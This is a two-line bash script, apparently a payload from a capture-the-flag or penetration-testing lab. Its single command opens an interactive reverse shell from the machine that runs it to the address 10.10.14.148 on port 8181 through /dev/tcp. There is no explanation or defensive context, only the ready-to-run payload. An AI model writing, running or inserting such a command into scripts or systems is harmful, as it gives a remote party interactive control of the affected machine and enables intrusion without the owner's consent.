#!/bin/bash
/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.148/8181 0>&1'
